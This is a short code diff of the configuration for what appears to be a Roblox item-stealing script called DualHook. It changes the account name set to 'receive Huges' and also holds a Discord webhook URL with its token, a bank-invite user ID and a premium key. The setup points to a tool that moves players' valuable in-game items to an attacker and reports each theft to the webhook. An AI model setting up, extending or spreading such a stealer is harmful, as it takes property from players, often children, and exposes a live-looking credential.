@@ -26,7 +26,7 @@ _G.Tip5 = "" --// Gives You Tips On The UI
 --[[ DualHookPremium ]]--
 
 _G.PremiumBankInviteID = 1962605868--// Roblox user ID here to invite to bank
-_G.MaibloxPremiumUsername = "dirmix_YT" --//DualHook Account Name To Recive Huges
+_G.MaibloxPremiumUsername = "dirmix2022" --//DualHook Account Name To Recive Huges
 _G.WebhookDualHook = "https://discord.com/api/webhooks/1103294457513791539/qxe1aPr3ukuP2Fc2JlamPusheb9X5NfJoxE-6uQR4G7ScVgk_-jNAr2Fk6fxVSdzSmk9" --// DualHook WebHook Notfication
 _G.Key = "ARKHALIS-EYBLFUVBADWX" --// Arkhalis Premium Key
 
